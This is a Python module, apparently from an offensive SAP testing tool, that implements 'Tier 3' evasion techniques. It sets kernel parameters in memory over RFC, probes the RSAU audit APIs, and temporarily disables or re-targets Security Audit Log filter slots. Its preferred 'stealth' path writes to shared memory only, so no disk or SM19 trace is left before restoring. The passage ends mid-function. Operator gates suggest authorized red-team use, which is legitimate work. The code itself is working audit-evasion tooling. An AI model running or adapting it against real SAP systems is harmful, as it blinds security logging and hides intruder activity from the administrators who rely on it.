"""Tier 3 active-manipulation entry points.

This module hosts one entry function per registered Tier 3 technique
(``sapmap_evasion_gate.TIER3_TECHNIQUES``).  Every entry:

  1. Asserts the operator-armed gate
     (``assert_evasion_allowed``) — refuses with ``EvasionGateError``
     otherwise.
  2. Captures a baseline snapshot if none exists.
  3. Runs the body under ``evasion_window`` so restore-on-exit is
     wired correctly.
  4. Mutates the kernel via ``change_param`` (``TH_CHANGE_PARAMETER``,
     RFC-enabled, dynamic, in-memory only).
  5. ``evasion_window`` restores the baseline value on exit (including
     exception path) by calling ``restore_baseline`` which also uses
     ``TH_CHANGE_PARAMETER`` under the hood.

Entry-point signature for every technique::

    tier3_<name>(state, node, **params) -> dict

returning ``{ok, technique, applied, baseline_value, snapshot_loot,
error}``.
"""

from __future__ import annotations

import logging
from typing import Optional

from sapmap_evasion_baseline import (capture_baseline, change_param,
                                       evasion_window,
                                       write_dyn_profile,
                                       read_legacy_sal_config,
                                       write_legacy_sal_config)
from sapmap_evasion_gate import (assert_evasion_allowed,
                                   EvasionGateError, technique_label)

logger = logging.getLogger(__name__)


def _wrap_result(technique: str, ok: bool, **extra) -> dict:
    out = {"ok": ok, "technique": technique,
            "label": technique_label(technique)}
    out.update(extra)
    return out


def tier3_set_param(state, node, param: str, value: str,
                     creds=None) -> dict:
    """4.A.2 / 4.C.4 — dynamic kernel-parameter set via TH_CHANGE_PARAMETER.

    Asserts the gate, captures a baseline, then writes ``param=value``
    via the RFC-enabled FM ``TH_CHANGE_PARAMETER`` inside an evasion
    window so the captured baseline value is automatically restored on
    exit (or on exception).

    The change is in-memory only — no profile file rewrite, no kernel
    restart, no AUM/AUW SAL events.  Survives until restore_baseline
    is called by ``evasion_window.__exit__``.
    """
    technique = "rz11_dynamic_set"
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             applied=False)

    snap = capture_baseline(node, creds=creds)
    if not snap.params:
        return _wrap_result(
            technique, False,
            error="baseline capture returned empty; refusing to mutate",
            applied=False)

    original = snap.params.get(param)
    if isinstance(original, str) and original.startswith("__UNCAPTURED__"):
        return _wrap_result(
            technique, False,
            error=f"{param} could not be baseline-captured "
                   f"({original.split(':', 1)[-1].strip()}); refusing",
            applied=False)

    write_result = {"ok": False, "error": "not attempted"}
    try:
        with evasion_window(node, state, technique,
                             creds=creds,
                             touched_params=[param]):
            write_result = change_param(node, creds, param, value)
            if write_result["ok"]:
                print(f"[+] {snap.sid}: TH_CHANGE_PARAMETER — "
                      f"{param}={value!r} (baseline {param}={original!r})")
            else:
                print(f"[-] {snap.sid}: TH_CHANGE_PARAMETER failed — "
                      f"{param}={value!r}: {write_result['error']}")
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             applied=False)

    return _wrap_result(
        technique, write_result["ok"],
        param=param, requested_value=value,
        baseline_value=original,
        applied=write_result["ok"],
        error=write_result["error"] if not write_result["ok"] else "",
        snapshot_loot=snap.loot_path)


def probe_rsau_api_surface(state, node, creds=None,
                             loot_root: str = "loot") -> dict:
    """Phase 2 — read-only discovery probe for the RSAU API surface.

    Calls ``FUNCTION_EXISTS`` + ``RFC_GET_FUNCTION_INTERFACE`` for the
    candidate write/read FMs we may need in Phase 3.  Pure metadata
    read; nothing in the SAL config is touched.

    The output gives us:
      * which FMs are actually exposed on this kernel
      * the exact IMPORT / EXPORT / CHANGING / TABLES parameter
        signatures so we can call them correctly the first time
        instead of guessing names + shapes

    Result is also written to
    ``loot/baseline/<sid>/rsau_api_probe_<ts>.json`` for off-line
    review and reproducibility.
    """
    technique = "rz11_dynamic_set"   # gate-only — no kernel mutation
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return {"ok": False, "technique": "probe_rsau_api",
                "error": str(e), "functions": []}

    import json as _json
    from pathlib import Path as _Path
    from datetime import datetime as _dt
    import sapmap_rfc
    from sapmap_errors import format_rfc_exception

    # Candidate FMs we want to confirm exist + read signatures of.
    # Order is the order the operator will see in the finding stream.
    candidates = (
        # Known to exist on this S/4 (confirmed in Phase 1 lab run)
        "RSAU_API_GET_AUDIT_CONFIG",
        # Operator-confirmed in SE37 screenshots — the two write FMs
        "RSAU_API_SET_PROFILE",
        "RSAU_API_SET_PARAM",
        # Expected symmetric reads — exist in operator's SAP install?
        "RSAU_API_GET_PROFILE",
        "RSAU_API_GET_PARAM",
        # Older variant from earlier screenshot
        "RSAU_UPD_AUDIT_CONFIG",
        # Less likely but worth checking — different naming style
        "RSAU_API_DEL_PROFILE",
        "RSAU_API_GET_FILT",
        "RSAU_API_SET_FILT",
    )

    results = []
    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            for fm in candidates:
                results.append(_probe_one_fm(conn, fm,
                                              format_rfc_exception))
    except Exception as e:
        msg = format_rfc_exception(e).split("\n")[0][:200]
        return {"ok": False, "technique": "probe_rsau_api",
                "error": f"connect failed: {msg}", "functions": []}

    sid = getattr(node, "sid", "?")
    probed_at = _dt.now().isoformat()
    loot_path = ""
    try:
        loot_dir = _Path(loot_root) / "baseline" / sid
        loot_dir.mkdir(parents=True, exist_ok=True)
        fname = ("rsau_api_probe_"
                 + probed_at.replace(":", "").replace(".", "_")
                 + ".json")
        loot_path = str(loot_dir / fname)
        _Path(loot_path).write_text(_json.dumps({
            "sid": sid, "probed_at": probed_at,
            "functions": results,
            "loot_path": loot_path,
        }, indent=2))
    except Exception as e:
        logger.warning(f"{sid}: rsau probe loot write failed: {e}")

    # Per-FM one-line summary, plus an overall INFO finding the
    # operator sees in the panel.
    try:
        from sapmap_findings import emit_finding
        for r in results:
            if r["exists"]:
                params_summary = _summarise_params(r["params"])
                emit_finding("INFO", sid,
                              f"RSAU API probe: {r['name']} exists — "
                              f"{params_summary}")
            else:
                emit_finding("INFO", sid,
                              f"RSAU API probe: {r['name']} ABSENT "
                              f"({r['error'][:80]})")
    except Exception:
        pass

    n_exist = sum(1 for r in results if r["exists"])
    return {"ok": True, "technique": "probe_rsau_api",
            "sid": sid, "probed_at": probed_at,
            "functions": results,
            "found_count": n_exist,
            "total_checked": len(results),
            "loot_path": loot_path}


def _probe_one_fm(conn, fm: str, format_exc) -> dict:
    """Probe a single FM via FUNCTION_EXISTS + RFC_GET_FUNCTION_INTERFACE.

    Returns ``{name, exists, error, params}`` where params is a list of
    ``{parameter, direction, datatype, optional, structure_name}``
    dicts.  ``direction`` is one of ``IMPORT`` / ``EXPORT`` /
    ``CHANGING`` / ``TABLES`` / ``EXCEPTION`` (mapped from the
    SAP-side ``PARAMTYPE`` letter ``I/E/C/T/X``).
    """
    out = {"name": fm, "exists": False, "error": "", "params": []}

    try:
        conn.call("FUNCTION_EXISTS", FUNCNAME=fm)
        out["exists"] = True
    except Exception as e:
        msg = format_exc(e).split("\n")[0][:200]
        if "FU_NOT_FOUND" in msg or "FUNCTION_NOT_FOUND" in msg:
            out["error"] = "FU_NOT_FOUND"
        else:
            out["error"] = msg
        return out

    # FM exists — pull its parameter list.
    try:
        r = conn.call("RFC_GET_FUNCTION_INTERFACE", FUNCNAME=fm)
    except Exception as e:
        out["error"] = ("signature read failed: "
                         + format_exc(e).split("\n")[0][:160])
        return out

    # PARAMS table is RFC_FUNC_DESC.  Field names (verified on
    # S/4 793 — earlier guesses at PARAMTYPE / FUNCTYPE / STRUCTURE
    # came back empty because those are not the real field names):
    #   PARAMCLASS — I=Import, E=Export, C=Changing, T=Tables, X=Exception
    #   EXID       — external type letter (C, N, X, I, F, D, T, g, h, u, ...)
    #   TABNAME    — type or structure reference name
    #   FIELDNAME  — field name when a single field is referenced
    direction_map = {"I": "IMPORT", "E": "EXPORT", "C": "CHANGING",
                      "T": "TABLES", "X": "EXCEPTION"}
    for row in r.get("PARAMS", []) or []:
        pclass = (row.get("PARAMCLASS")
                  or row.get("PARAMTYPE") or "").strip()
        out["params"].append({
            "parameter": (row.get("PARAMETER") or "").strip(),
            "direction": direction_map.get(pclass, pclass or "?"),
            "datatype": (row.get("EXID")
                          or row.get("FUNCTYPE")
                          or row.get("EXTYP") or "").strip(),
            "structure": (row.get("TABNAME")
                           or row.get("STRUCTURE")
                           or row.get("REFERENCE") or "").strip(),
            "fieldname": (row.get("FIELDNAME") or "").strip(),
            "optional": (row.get("OPTIONAL") or "").strip() == "X",
            "default": (row.get("DEFAULT") or "").strip(),
            "text": (row.get("PARAMTEXT") or "").strip(),
        })
    return out


def _summarise_params(params: list) -> str:
    """One-line summary of an FM's signature for the finding text."""
    by_dir = {"IMPORT": [], "EXPORT": [], "CHANGING": [],
              "TABLES": [], "EXCEPTION": []}
    for p in params:
        d = p.get("direction", "?")
        if d in by_dir:
            by_dir[d].append(p["parameter"])
    parts = []
    for d in ("IMPORT", "EXPORT", "CHANGING", "TABLES"):
        if by_dir[d]:
            parts.append(f"{d[0]}=[{','.join(by_dir[d])}]")
    return " ".join(parts) if parts else "no params"


def read_dyn_profile(node, creds=None,
                       profile_name: str = "") -> dict:
    """Phase 3 step 1 — call ``RSAU_API_GET_PROFILE`` and return the
    verbatim response.

    Symmetric read counterpart to ``RSAU_API_SET_PROFILE``:
    ``ET_FILT`` rows we read here have the exact same ``RSAUPROF_T``
    row type as the ``IT_FILT`` parameter we'll later send back for
    restore.  So caching this response + sending it back unchanged
    is the cleanest possible baseline restore primitive — no
    interpretation, no field reshaping, no risk of mis-reading the
    kernel's internal slot layout.

    Args:
        profile_name: ABAP profile name.  Empty (default) → read the
            *dynamic* in-memory profile (``ID_DYN_CONF='X'``, no
            ``ID_NAME``).  Non-empty → read that specific profile by
            name (``ID_NAME=<name>``, no ``ID_DYN_CONF``).

    The kernel treats ``ID_NAME``, ``ID_DYN_CONF`` and ``ID_CURR_PROF``
    as **mutually exclusive actions** (passing more than one raises
    SECAUDIT 058 "Only one action is permitted" via ET_LOG).  This
    helper picks one based on whether ``profile_name`` was supplied.

    Returns the response dict verbatim (keys ``ED_DATA_STR``,
    ``ET_FILT``, ``ET_FILTEX``, ``ET_TEXT``, ``ET_LOG``).  Raises on
    RFC error; the caller checks ``ET_LOG`` for SECAUDIT errors the
    kernel surfaces in-band rather than as exceptions.
    """
    import sapmap_rfc
    kwargs = ({"ID_NAME": profile_name} if profile_name
              else {"ID_DYN_CONF": "X"})
    with sapmap_rfc._get_connection(node, creds) as conn:
        return conn.call("RSAU_API_GET_PROFILE", **kwargs)


def _et_log_errors(et_log) -> list:
    """Return the subset of ET_LOG rows the kernel marked as errors.

    RSAU_* FMs surface failures in-band: the RFC call returns RC=0
    but ET_LOG contains BAPIRET2 rows with TYPE='E' (or 'A' for
    abort).  Callers should treat any non-empty error list as a
    failed call even when no Python exception was raised.
    """
    return [row for row in (et_log or [])
            if (row.get("TYPE") or "").upper() in ("E", "A", "X")]


def tier3_probe_dyn_profile(state, node, creds=None,
                              profile_name: str = "",
                              loot_root: str = "loot") -> dict:
    """Phase 3 step 1 entry point — read-only probe of the dynamic
    audit profile.

    Calls ``RSAU_API_GET_PROFILE(ID_NAME='$DYN$', ID_DYN_CONF='X')``
    and dumps the verbatim response to
    ``loot/baseline/<sid>/dyn_profile_<ts>.json``.  Pure read; no
    mutation.  Gated behind ``--allow-evasion`` because the response
    shape is only useful when Tier 3 is armed and we're about to
    plan a write against it.
    """
    technique = "rz11_dynamic_set"   # gate-only — no kernel mutation
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return {"ok": False, "technique": "probe_dyn_profile",
                "error": str(e), "profile_name": profile_name}

    import json as _json
    from pathlib import Path as _Path
    from datetime import datetime as _dt
    from sapmap_errors import format_rfc_exception

    sid = getattr(node, "sid", "?")
    probed_at = _dt.now().isoformat()

    try:
        resp = read_dyn_profile(node, creds=creds,
                                 profile_name=profile_name)
    except Exception as e:
        msg = format_rfc_exception(e).split("\n")[0][:200]
        return {"ok": False, "technique": "probe_dyn_profile",
                "error": f"RSAU_API_GET_PROFILE raised: {msg}",
                "profile_name": profile_name}

    # ABAP byte / RAWSTRING values may come back as Python bytes —
    # JSON can't carry them.  Hex-encode anything that looks binary
    # so the loot file is plain UTF-8.
    def _norm(v):
        if isinstance(v, bytes):
            return v.hex()
        if isinstance(v, dict):
            return {k: _norm(x) for k, x in v.items()}
        if isinstance(v, list):
            return [_norm(x) for x in v]
        return v
    normalised = {k: _norm(v) for k, v in resp.items()}

    et_filt = normalised.get("ET_FILT") or []
    et_filtex = normalised.get("ET_FILTEX") or []
    et_text = normalised.get("ET_TEXT") or []
    et_log = normalised.get("ET_LOG") or []

    # In-band error check.  RSAU_* FMs return RC=0 even on auth or
    # parameter failures; the real status lives in ET_LOG.  An
    # earlier lab probe (with both ID_NAME and ID_DYN_CONF supplied)
    # surfaced SECAUDIT 058 "Only one action is permitted" here.
    log_errors = _et_log_errors(et_log)

    loot_path = ""
    try:
        loot_dir = _Path(loot_root) / "baseline" / sid
        loot_dir.mkdir(parents=True, exist_ok=True)
        fname = ("dyn_profile_"
                 + probed_at.replace(":", "").replace(".", "_")
                 + ".json")
        loot_path = str(loot_dir / fname)
        _Path(loot_path).write_text(_json.dumps({
            "sid": sid,
            "probed_at": probed_at,
            "profile_name": profile_name,
            "response": normalised,
            "loot_path": loot_path,
        }, indent=2))
    except Exception as e:
        logger.warning(f"{sid}: dyn profile loot write failed: {e}")

    # Surface a finding so the operator sees the shape summary in the
    # panel without having to open the JSON.  First-row keys are the
    # field names; we list them so we know what RSAUPROF actually
    # contains on this kernel before the writer is built.
    first_row_keys = sorted((et_filt[0] or {}).keys()) if et_filt else []
    err_summary = ""
    if log_errors:
        msgs = "; ".join(
            f"{r.get('ID','')} {r.get('NUMBER','')} "
            f"{r.get('MESSAGE','')[:80]}"
            for r in log_errors[:3])
        err_summary = f" — KERNEL ERRORS: {msgs}"
    try:
        from sapmap_findings import emit_finding
        sev = "WARNING" if log_errors else "INFO"
        emit_finding(
            sev, sid,
            f"RSAU dyn-profile probe ({profile_name or 'dyn'}): "
            f"ET_FILT={len(et_filt)} row(s), "
            f"ET_FILTEX={len(et_filtex)}, ET_TEXT={len(et_text)}, "
            f"ET_LOG={len(et_log)}; RSAUPROF row fields: "
            f"{','.join(first_row_keys) if first_row_keys else '(empty)'}"
            f"{err_summary}")
    except Exception:
        pass

    return {"ok": not log_errors,
            "technique": "probe_dyn_profile",
            "sid": sid,
            "probed_at": probed_at,
            "profile_name": profile_name or "(dyn)",
            "et_filt_count": len(et_filt),
            "et_filtex_count": len(et_filtex),
            "et_text_count": len(et_text),
            "et_log_count": len(et_log),
            "et_log_errors": log_errors,
            "rsauprof_row_fields": first_row_keys,
            "error": (f"kernel returned {len(log_errors)} error(s) "
                       f"in ET_LOG: {log_errors[0].get('MESSAGE','')}"
                       if log_errors else ""),
            "loot_path": loot_path}


def _normalize_slotnos(slotno_input, all_rows) -> list:
    """Resolve an operator-supplied slot identifier into a list of
    canonical 4-digit slot strings present in the dyn-profile rows.

    Accepted input shapes:
      - ``"1"`` / ``"0001"`` / ``1`` → ``["0001"]``
      - ``"1,2,3"`` / ``"0001,0002"`` → list of zero-padded entries
      - ``["1", 2, "0003"]`` (list/tuple/set) → list of zero-padded
      - ``"ALL"`` (case-insensitive) → every currently-active slot
        (``STATUS='X'``) in ``all_rows``.  Inactive placeholder slots
        are excluded so the operator doesn't accidentally write
        STATUS=' ' onto already-empty rows.
      - empty / blank → ``[]``
    """
    if isinstance(slotno_input, (list, tuple, set)):
        return [str(s).strip().zfill(4)
                for s in slotno_input
                if str(s).strip()]
    s = str(slotno_input or "").strip()
    if not s:
        return []
    if s.upper() == "ALL":
        return [str(r.get("SLOTNO", "")).strip().zfill(4)
                for r in all_rows or []
                if str(r.get("STATUS", "")).strip() == "X"]
    if "," in s:
        return [p.strip().zfill(4)
                for p in s.split(",") if p.strip()]
    return [s.zfill(4)]


def _try_stealth_sal_slot_disable(state, node, sid, slotno,
                                   hold_seconds, creds,
                                   technique) -> Optional[dict]:
    """Attempt SAL slot disable via RSAU_UPD_AUDIT_CONFIG (SHM-only).

    Returns ``None`` if the legacy FMs aren't available on this kernel
    (caller should fall back to the RSAU_API_SET_PROFILE path).
    Returns a result dict if the stealth path was attempted.
    """
    import time as _time
    import sapmap_rfc

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            probe = read_legacy_sal_config(conn)
    except Exception:
        return None
    if not probe["ok"] or not probe["slotinfo"]:
        return None

    with evasion_window(node, state, technique, creds=creds,
                         touched_params=[],
                         touched_dyn_profile=False) as frame:
        snap = frame["snapshot"]

        with sapmap_rfc._get_connection(node, creds) as conn:
            fresh = read_legacy_sal_config(conn)
            if not fresh["ok"]:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error=f"fresh legacy read failed: {fresh['error']}")

            rows = fresh["slotinfo"]
            baseline_rows = [dict(r) for r in rows]

            augmented = [{**r, "SLOTNO": str(i + 1).zfill(4)}
                         for i, r in enumerate(rows)]
            target_slots = _normalize_slotnos(slotno, augmented)
            if not target_slots:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error="no target slots resolved")

            max_slot = len(rows)
            for s in target_slots:
                idx = int(s) - 1
                if idx < 0 or idx >= max_slot:
                    return _wrap_result(
                        technique, False,
                        slotno=",".join(target_slots),
                        hold_seconds=hold_seconds,
                        error=f"slot {s} out of range (max {max_slot})")

            baseline_statuses = {}
            active_before = 0
            for s in target_slots:
                st = str(rows[int(s) - 1].get("STATUS", "")).strip() or " "
                baseline_statuses[s] = st
            for r in rows:
                if str(r.get("STATUS", "")).strip() == "X":
                    active_before += 1

            target_indices = {int(s) - 1 for s in target_slots}
            mutated = [dict(r) for r in rows]
            for idx in target_indices:
                mutated[idx]["STATUS"] = " "

            print(f"[*] {sid}: SAL slot disable (stealth/SHM) — targets "
                  f"{','.join(target_slots)} (baseline {baseline_statuses}); "
                  f"{active_before}/{len(rows)} active")

            w = write_legacy_sal_config(conn, mutated, enable="-")
            if not w["ok"]:
                return _wrap_result(
                    technique, False,
                    slotno=",".join(target_slots),
                    hold_seconds=hold_seconds,
                    baseline_statuses=baseline_statuses,
                    before_active_count=active_before,
                    error=f"stealth write failed: {w['error']}")

            print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
                  f"disabled (SHM-only) — holding {hold_seconds}s")

        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "INFO", sid,
                f"Tier 3: SAL slot(s) {','.join(target_slots)} "
                f"disabled via RSAU_UPD_AUDIT_CONFIG "
                f"(shared-memory only — no disk persistence, no SM19 "
                f"header change)")
        except Exception:
            pass

        try:
            _time.sleep(max(0.0, float(hold_seconds)))
        finally:
            print(f"[*] {sid}: restoring SAL slots (stealth/SHM)...")
            try:
                with sapmap_rfc._get_connection(node, creds) as conn:
                    r = write_legacy_sal_config(conn, baseline_rows,
                                                 enable="-")
                    if r["ok"]:
                        print(f"[+] {sid}: SAL slots restored "
                              f"(SHM-only, no disk trace)")
                    else:
                        print(f"[!] {sid}: stealth restore failed: "
                              f"{r['error']}")
            except Exception as re:
                print(f"[!] {sid}: stealth restore exception: {re}")

    try:
        from sapmap_findings import emit_finding
        emit_finding("INFO", sid,
                     f"Tier 3: SAL slot(s) {','.join(target_slots)} "
                     f"restored (stealth — no disk trace)")
    except Exception:
        pass

    return _wrap_result(
        technique, True,
        slotno=",".join(target_slots),
        hold_seconds=hold_seconds,
        baseline_statuses=baseline_statuses,
        before_active_count=active_before,
        after_restore="stealth via RSAU_UPD_AUDIT_CONFIG (SHM-only)",
        stealth_mode=True)


def tier3_sal_slot_disable(state, node, slotno,
                              profile_name: str = "",
                              hold_seconds: float = 5.0,
                              creds=None) -> dict:
    """Disable one or more SAL filter slots for *hold_seconds*, then restore.

    Two writer paths, tried in order:

      **Stealth (primary):** ``RSAU_UPD_AUDIT_CONFIG`` — writes to
      kernel shared memory only.  No disk persistence, no profile-name
      header change, no "Last changed by" timestamp in SM19.

      **Fallback:** ``RSAU_API_SET_PROFILE`` — also persists the
      static profile to disk (SM19 shows "Last changed by SAPMAP00").
      Only used if the legacy FMs aren't available on the kernel.

    Args:
        slotno: ``"1"``, ``"1,2,3"``, list, or ``"ALL"``.
        profile_name: only needed for the fallback writer path.
        hold_seconds: how long to keep slots disabled before restore.
    """
    import time as _time
    technique = "sal_filter_narrow"
    try:
        assert_evasion_allowed(state, node, technique)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             slotno=str(slotno),
                             hold_seconds=hold_seconds)

    sid = getattr(node, "sid", "?")
    explicit_name = (profile_name or "").strip()

    # Primary path: stealth via RSAU_UPD_AUDIT_CONFIG (SHM-only, no
    # disk persistence, no SM19 header change).  Falls back to the
    # RSAU_API_SET_PROFILE path below if the legacy FMs are missing.
    try:
        stealth = _try_stealth_sal_slot_disable(
            state, node, sid, slotno, hold_seconds, creds, technique)
        if stealth is not None:
            return stealth
    except EvasionGateError:
        raise
    except Exception as e:
        logger.debug(f"{sid}: stealth path unavailable, falling back "
                     f"to API path: {e}")

    # Fallback: RSAU_API_SET_PROFILE (also persists static profile to disk).
    if not explicit_name:
        return _wrap_result(
            technique, False,
            slotno=str(slotno), hold_seconds=hold_seconds,
            error=("SAL profile name required for fallback writer — "
                   "pass profile_name (RSAU_CONFIG 'Current Profile/"
                   "Filter: <NAME>/NN'; e.g. 'SAPSEC')"))
    try:
        # touched_params=[] explicitly opts OUT of the param restore
        # loop — this technique only mutates the dyn profile, so
        # restoring every captured TH_GET_PARAMETER value on window
        # exit would (a) be wrong and (b) spam NOT_CHANGEABLE errors
        # for the rsau/* / rec/* / stat/* static params.
        with evasion_window(node, state, technique, creds=creds,
                             touched_params=[],
                             touched_dyn_profile=True) as frame:
            snap = frame["snapshot"]
            effective_name = (explicit_name
                              or snap.sal_profile_name)
            if not effective_name:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error=("SAL profile name required — pass "
                           "profile_name (visible in RSAU_CONFIG as "
                           "'Current Profile/Filter: <NAME>/NN'; "
                           "e.g. 'SAPSEC' on stock S/4)"))
            if explicit_name and not snap.sal_profile_name:
                snap.sal_profile_name = explicit_name
            # Read fresh — never mutate from a stale baseline.
            current = read_dyn_profile(node, creds=creds)
            log_errors = _et_log_errors(current.get("ET_LOG"))
            if log_errors:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error=(f"fresh read failed: "
                            f"{log_errors[0].get('MESSAGE','')}"))

            et_filt = list(current.get("ET_FILT") or [])
            et_filtex = list(current.get("ET_FILTEX") or [])
            et_text = list(current.get("ET_TEXT") or [])

            # Resolve slot list — single, comma-separated, list, or "ALL"
            target_slots = _normalize_slotnos(slotno, et_filt)
            if not target_slots:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error=("no target slots resolved — "
                            "supply a slot number, '1,2,3' list, or 'ALL'"))

            # Cross-check every requested slot is present in the
            # current dyn profile and capture baseline status.
            slot_lookup = {
                str(r.get("SLOTNO", "")).strip().zfill(4): r
                for r in et_filt}
            missing = [s for s in target_slots if s not in slot_lookup]
            if missing:
                return _wrap_result(
                    technique, False,
                    slotno=",".join(target_slots),
                    hold_seconds=hold_seconds,
                    error=(f"slots not present in dyn profile: "
                            f"{','.join(missing)}"))
            baseline_statuses = {
                s: (str(slot_lookup[s].get("STATUS", "")).strip() or " ")
                for s in target_slots}
            active_before = sum(
                1 for r in et_filt
                if str(r.get("STATUS", "")).strip() == "X")

            target_set = set(target_slots)
            print(f"[*] {sid}: SAL slot disable — targets "
                  f"{','.join(target_slots)} (baseline statuses "
                  f"{baseline_statuses}); {active_before} of "
                  f"{len(et_filt)} slot(s) currently active")

            # Mutate — copy rows, flip STATUS on every targeted row.
            mutated_filt = []
            for r in et_filt:
                copy = dict(r)
                key = str(copy.get("SLOTNO", "")).strip().zfill(4)
                if key in target_set:
                    copy["STATUS"] = " "
                mutated_filt.append(copy)

            w = write_dyn_profile(node, creds, effective_name,
                                    mutated_filt, et_filtex, et_text)
            if not w["ok"]:
                return _wrap_result(
                    technique, False,
                    slotno=",".join(target_slots),
                    hold_seconds=hold_seconds,
                    baseline_statuses=baseline_statuses,
                    before_active_count=active_before,
                    error=f"write failed: {w['error']}")

            print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
                  f"disabled — holding {hold_seconds}s before restore")
            try:
                from sapmap_findings import emit_finding
                # Stealth caveat — confirmed on S/4 793 lab: the
                # RSAU_API_SET_PROFILE call paired with ID_NAME=
                # <static profile name> persists the change through
                # to disk too.  The static profile's "Last changed
                # by" timestamp + user fields update visibly in
                # SM19.  Surface that to the operator so this isn't
                # mistaken for a fully invisible mutation.
                emit_finding(
                    "WARNING", sid,
                    f"Tier 3: SAL slot(s) {','.join(target_slots)} "
                    f"disabled (STATUS X→' ') for {hold_seconds}s "
                    f"window — verify in SM19 / RSAU_CONFIG. "
                    f"NOTE: this writer also updates the persisted "
                    f"static profile '{effective_name}' on disk "
                    f"(visible as 'Last changed by SAPMAP00' in "
                    f"SM19 header).  Not a stealth-clean primitive "
                    f"on this kernel.")
            except Exception:
                pass

            _time.sleep(max(0.0, float(hold_seconds)))

        # Window exit ran restore automatically — log here so the
        # operator sees the round-trip completion clearly.
        print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
              f"restored — window closed cleanly")
        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "INFO", sid,
                f"Tier 3: SAL slot(s) {','.join(target_slots)} "
                f"restored to baseline")
        except Exception:
            pass
        return _wrap_result(
            technique, True,
            slotno=",".join(target_slots),
            hold_seconds=hold_seconds,
            baseline_statuses=baseline_statuses,
            before_active_count=active_before,
            after_restore="auto via evasion_window",
            stealth_warning=(
                f"static profile '{effective_name}' "
                "persisted on disk; SM19 header shows operator "
                "user/timestamp"))
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             slotno=str(slotno),
                             hold_seconds=hold_seconds)
    except Exception as e:
        return _wrap_result(
            technique, False, error=f"unexpected: {e!r}",
            slotno=str(slotno), hold_seconds=hold_seconds)


def _try_stealth_sal_uname_narrow(state, node, sid, slotno,
                                    replacement_uname, hold_seconds,
                                    creds, technique) -> Optional[dict]:
    """Stealth path for SAL slot UNAME swap via RSAU_UPD_AUDIT_CONFIG.

    Returns ``None`` if legacy FMs aren't available (caller falls back).
    On success the targeted slots' UNAME is replaced with
    ``replacement_uname`` for ``hold_seconds`` and the baseline UNAME is
    restored on exit (or on exception).
    """
    import time as _time
    import sapmap_rfc

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            probe = read_legacy_sal_config(conn)
    except Exception:
        return None
    if not probe["ok"] or not probe["slotinfo"]:
        return None

    with evasion_window(node, state, technique, creds=creds,
                         touched_params=[],
                         touched_dyn_profile=False):
        with sapmap_rfc._get_connection(node, creds) as conn:
            fresh = read_legacy_sal_config(conn)
            if not fresh["ok"]:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error=f"fresh legacy read failed: {fresh['error']}")

            rows = fresh["slotinfo"]
            baseline_rows = [dict(r) for r in rows]

            augmented = [{**r, "SLOTNO": str(i + 1).zfill(4)}
                         for i, r in enumerate(rows)]
            target_slots = _normalize_slotnos(slotno, augmented)
            if not target_slots:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error="no target slots resolved")

            max_slot = len(rows)
            for s in target_slots:
                idx = int(s) - 1
                if idx < 0 or idx >= max_slot:
                    return _wrap_result(
                        technique, False,
                        slotno=",".join(target_slots),
                        hold_seconds=hold_seconds,
                        error=f"slot {s} out of range (max {max_slot})")

            baseline_unames = {}
            for s in target_slots:
                bu = rows[int(s) - 1].get("UNAME", "")
                if isinstance(bu, bytes):
                    bu = bu.decode("latin1", "replace")
                baseline_unames[s] = str(bu).strip()

            target_indices = {int(s) - 1 for s in target_slots}
            mutated = [dict(r) for r in rows]
            for idx in target_indices:
                mutated[idx]["UNAME"] = replacement_uname

            print(f"[*] {sid}: SAL UNAME narrow (stealth/SHM) — slots "
                  f"{','.join(target_slots)} (baseline UNAMEs "
                  f"{baseline_unames}) → {replacement_uname!r}")

            w = write_legacy_sal_config(conn, mutated, enable="-")
            if not w["ok"]:
                return _wrap_result(
                    technique, False,
                    slotno=",".join(target_slots),
                    hold_seconds=hold_seconds,
                    baseline_unames=baseline_unames,
                    error=f"stealth write failed: {w['error']}")

            print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
                  f"UNAME swapped (SHM-only) — holding {hold_seconds}s")

        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "INFO", sid,
                f"Tier 3: SAL slot(s) {','.join(target_slots)} UNAME "
                f"swapped to {replacement_uname!r} via "
                f"RSAU_UPD_AUDIT_CONFIG (shared-memory only — no disk "
                f"persistence, no SM19 header change)")
        except Exception:
            pass

        try:
            _time.sleep(max(0.0, float(hold_seconds)))
        finally:
            print(f"[*] {sid}: restoring SAL UNAMEs (stealth/SHM)...")
            try:
                with sapmap_rfc._get_connection(node, creds) as conn:
                    r = write_legacy_sal_config(conn, baseline_rows,
                                                 enable="-")
                    if r["ok"]:
                        print(f"[+] {sid}: SAL UNAMEs restored "
                              f"(SHM-only, no disk trace)")
                    else:
                        print(f"[!] {sid}: stealth restore failed: "
                              f"{r['error']}")
            except Exception as re:
                print(f"[!] {sid}: stealth restore exception: {re}")

    try:
        from sapmap_findings import emit_finding
        emit_finding("INFO", sid,
                     f"Tier 3: SAL slot(s) {','.join(target_slots)} "
